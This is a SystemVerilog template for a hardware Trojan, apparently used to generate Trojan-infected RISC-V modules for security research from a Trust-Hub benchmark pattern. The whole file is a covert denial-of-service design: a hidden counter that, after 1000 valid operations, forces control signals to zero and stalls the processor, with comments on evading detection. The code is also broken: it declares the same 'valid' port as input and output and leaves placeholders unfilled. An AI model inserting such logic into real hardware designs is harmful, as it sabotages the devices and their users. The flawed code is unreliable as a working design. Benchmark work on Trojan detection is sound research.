/**
 * Hardware Trojan Template: Denial of Service (DoS)
 * 
 * Category: Sequential Logic
 * Pattern Type: Denial of Service
 * 
 * Source: Trust-Hub Benchmark AES-T1400
 * Reference: https://trust-hub.org/benchmarks/AES-T1400
 * 
 * Description:
 *   Disables critical functionality by forcing control signals to zero
 *   after a specific number of operations (counter-based trigger).
 *   
 * RISC-V Adaptation:
 *   Targets control signals like valid, ready, enable in RISC-V processors.
 *   Common targets: instruction valid, data valid, CSR enable signals.
 *
 * Trigger Mechanism:
 *   Counter-based: Activates after N operations
 *   Increments on specific signal activity
 *
 * Payload:
 *   Forces control signals to 0, disabling module functionality
 *
 * Author: Sharjeel Imtiaz (Tallinn University of Technology)
 * Date: January 2026
 * 
 */

module IntegerRegisterWriteStage_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic valid,
    output logic valid,
    
    // Additional module signals as needed
    input  logic {{TRIGGER_SIGNAL_2}},
    output logic {{PAYLOAD_SIGNAL_2}}
);

    // ============================================================
    // Trojan State
    // ============================================================
    
    // Counter for trigger condition
    localparam int TRIGGER_THRESHOLD = 1000;  // Activate after N operations
    logic [31:0] trojan_counter;
    logic        trojan_active;
    
    // ============================================================
    // TROJAN TRIGGER LOGIC
    // ============================================================
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            // Increment counter when trigger signal is active
            if (valid) begin
                trojan_counter <= trojan_counter + 1;
            end
            
            // Activate Trojan when threshold reached
            if (trojan_counter >= TRIGGER_THRESHOLD) begin
                trojan_active <= 1'b1;
            end
        end
    end
    
    // ============================================================
    // TROJAN PAYLOAD LOGIC
    // ============================================================
    
    // DoS Attack: Force control signals to 0 when Trojan is active
    assign valid = trojan_active ? 1'b0 : valid_normal;
    
    // Multiple payload signals can be affected
    assign {{PAYLOAD_SIGNAL_2}} = trojan_active ? 1'b0 : {{PAYLOAD_SIGNAL_2}}_normal;
    
    // ============================================================
    // Normal Operation (for reference - removed during generation)
    // ============================================================
    
    // These assignments represent normal module behavior
    // The generator will replace these with actual module logic
    logic valid_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign valid_normal = valid;
    assign {{PAYLOAD_SIGNAL_2}}_normal = {{TRIGGER_SIGNAL_2}};

endmodule

/**
 * Usage Example:
 * 
 * // For ibex_decoder module:
 * module ibex_decoder_trojan (
 *     input  logic clk_i,           // clk_i
 *     input  logic rst_ni,          // rst_ni
 *     input  logic instr_valid_i,   // valid
 *     output logic instr_valid_o    // valid
 * );
 *     // Trojan activates after 1000 valid instructions
 *     // Then forces instr_valid_o to 0, preventing execution
 * endmodule
 *
 * Expected Behavior:
 *   - Normal operation for first 1000 instructions
 *   - After threshold, all instructions become invalid
 *   - Processor appears to stall/hang
 *
 * Detection Difficulty: Medium
 *   - Visible in functional testing if threshold is low
 *   - Hard to detect if threshold is high (rare trigger)
 *   - Counter adds small area overhead (~32 flip-flops)
 */